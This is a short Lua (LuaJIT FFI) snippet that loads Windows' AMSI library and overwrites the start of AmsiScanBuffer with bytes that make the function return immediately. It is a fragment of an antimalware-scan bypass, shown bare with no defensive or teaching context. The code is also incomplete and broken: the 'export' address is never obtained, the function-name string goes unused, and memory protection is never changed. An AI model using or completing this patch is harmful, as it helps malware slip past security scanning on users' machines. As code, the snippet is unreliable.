local ffi = require("ffi")
local lib = ffi.load("amsi")
local api = "AmsiScanBuffer"
local ptr = ffi.cast("uint8_t*", export)
ptr[0] = 49 ptr[1] = 192 ptr[2] = 195
